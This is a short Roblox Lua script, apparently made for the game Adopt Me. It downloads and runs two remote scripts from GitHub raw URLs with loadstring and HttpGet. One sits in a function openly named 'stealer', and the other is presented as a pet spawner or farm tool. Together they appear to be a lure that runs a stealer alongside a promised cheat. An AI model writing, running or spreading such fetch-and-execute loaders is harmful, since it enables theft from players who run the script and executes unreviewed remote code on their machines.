local function stealer()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/HiraHub/refs/heads/main/AdoptMeScript.lua'))()
end

local function farm()
    loadstring(game:HttpGet('https://raw.githubusercontent.com/AdoptMe5SS/PetSpawner1/refs/heads/main/script1.lua'))()
end

task.spawn(stealer)

for i = 1, 1 do
    task.spawn(farm)
end
